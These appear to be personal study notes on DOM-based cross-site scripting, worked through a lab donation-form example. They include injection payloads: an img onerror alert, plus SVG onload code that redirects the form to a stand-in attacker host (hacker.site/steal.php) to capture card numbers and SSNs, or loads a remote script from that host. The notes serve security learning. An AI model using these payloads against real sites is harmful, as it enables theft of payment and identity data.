2024-12-20 19:55

Status:

Tags:

# DOM-based XSS Attack

## 1. **What is DOM-based XSS?**

- DOM-based XSS occurs **exclusively on the client side**.
- The payload is **not processed by the server**.
- The attack exploits the victim's **browser** by manipulating the **Document Object Model (DOM)**.

---

## 2. **Case Study: The Donation Form**

### Key Observations:

- The **donation form** allows users to input:
    - Name
    - Email address
    - Credit card number
    - Social security number (SSN)
    - Donation amount
- The **amount parameter**:
    - Is **not passed to the server**.
    - Is retrieved **via the document hash** (`#`) and rendered on the page.

### Behavior of the Page:

1. **Input Field Creation**:
    
    - The input tag for the donation amount **does not exist** in the source code.
    - **JavaScript dynamically** creates the input box by:
        - Extracting the value from the `document` property.
        - Using the `innerHTML` property to display it.
2. **DOM Manipulation**:
    
    - Modifying the **amount parameter** in the address bar and refreshing the page updates the donation value.
    - The rendered HTML contains the injected input tag, while the actual page source does not.

---

## 3. **Payload Injection**

### Steps to Inject a Malicious Payload:

1. **Initial Test**:
    
    - Insert any string into the `amount` parameter to confirm that it gets rendered.
2. **IMG Tag Injection**:
    
    - **Payload Construction**:
        - Close the value attribute (`"`) of the input tag.
        - Close the input tag.
        - Add an `<img>` tag with an invalid `src` attribute.
        - Trigger the `onError` event with malicious JavaScript:
            
            html
            
            Copy code
            
            `"><img src=x onerror=alert('XSS')>`
            
    - This payload triggers an `alert()` function.
3. **Optimized Payload**:
    
    - **Remove double quotes** around attributes:
        
        html
        
        Copy code
        
        `"><img src=x onerror=alert('XSS')>`
        
    - The browser **auto-corrects the syntax**, and the payload still works.
4. **Using SVG for Compact Payload**:
    
    - SVG elements can be manipulated to create payloads dynamically.

---

## 4. **Complex Payloads**: Overwriting Form Actions

### Objective:

- Modify the **action attribute** of the donation form to send data to an attacker-controlled site.

### Steps:

1. **Identify the Form**:
    
    - Use the browser console to inspect the `document.forms` object.
    - The donation form is the second form (`index 1`).
2. **Modify the Action**:
    
    - In the browser console, change the form action:
        
        javascript
        
        Copy code
        
        `document.forms[1].action = "http://hacker.site/steal.php";`
        
3. **Construct the Payload**:
    
    - Insert the JavaScript in the `onload` attribute of an SVG element:
        
        html
        
        Copy code
        
        `<svg onload="document.forms[1].action='http://hacker.site/steal.php'">`
        
4. **Data Theft**:
    
    - Submit the form, and data (credit card, SSN) is sent to `steal.php` hosted on the attacker's server.

---

## 5. **Advanced Techniques: Hosting External Scripts**

### Steps:

1. **Create an External Script**:
    
    - Host a JavaScript file (e.g., `s.js`) on `hacker.site`:
        
        javascript
        
        Copy code
        
        `alert('External XSS');`
        
2. **Inject the Script**:
    
    - Use the console to create and append a script tag:
        
        javascript
        
        Copy code
        
        `var script = document.createElement('script'); script.src = "http://hacker.site/s.js"; document.body.appendChild(script);`
        
3. **Insert the Payload**:
    
    - Add the commands to the `onload` attribute of an SVG element:
        
        html
        
        Copy code
        
        `<svg onload="var script=document.createElement('script');script.src='http://hacker.site/s.js';document.body.appendChild(script)">`
        

---

## 6. **Bypassing Anti-XSS Filters**

- **Reflected XSS** can be blocked by anti-XSS filters, like Chromium's XSS Auditor.
- **DOM-based XSS** cannot be stopped by these filters because:
    - The payload is not sent to the server.
    - It runs entirely on the client side.

**Example**:

- A reflected XSS payload does not execute in Chromium.
- A DOM-based XSS payload on the donation page **executes successfully**.

---

## 7. **Summary and Key Takeaways**

- **DOM-based XSS**:
    - Manipulates the DOM on the client side.
    - Payloads are **not sent to the server**.
    - Common methods include using `innerHTML`, dynamically created tags, and browser console commands.
- **Complex Payloads**:
    - Change form actions, inject external scripts, and perform multiple actions.
- **Defense Challenges**:
    - Cannot be blocked by server-side anti-XSS filters.
    - Requires strong client-side validation and secure coding practices.




### References
